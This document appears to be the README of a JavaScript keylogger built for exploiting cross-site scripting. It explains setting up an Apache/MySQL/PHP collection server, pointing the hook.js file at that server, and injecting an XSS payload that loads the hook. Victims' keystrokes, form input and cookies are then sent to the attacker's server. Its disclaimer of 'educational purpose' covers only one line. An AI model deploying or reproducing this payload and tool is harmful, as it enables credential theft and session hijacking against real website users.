# keylogger.js
A JS keylogger to exploit XSS

> This tool is only for educational purpose, do not use it against real environment



## Functionnalities

- Exfiltrate input field data
- Exfiltrate cookies
- Keylogging
- Display alert box
- Redirect user



## Install

You may need Apache + Mysq + PHP (+ php-curl)

```
# apt-get install apache2 mysql-server php php-mysql php-curl
```



Pull the keylogger source code:

```
git clone https://github.com/Sharpforce/keylogger.js.git
mv /var/www/html/keylogger/* ./
```



### Init the database

```
# mysql -u root
```

Creating a new user with specific rights:

```
MariaDB [(none)]> grant all on *.* to keylogger@localhost identified by 'keylogger';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> quit
Bye
```

Creating the database (will result in an empty page):

Visit the page http://ip/reset_database.php



### Exploit JS

The file hook.js is a hook. You need to replace the ip address in the first line with the keylogger.js server ip address:

```javascript
var address = "your server ip";
```



Insert the hook in your XSS payload:

```
?vulnerable_param=<script src="http://your_server_ip/hook.js"/>
```



Then, the keylogger server should list hooked browsers:

![image-20200214110103913](img/image-20200214110103913.png)















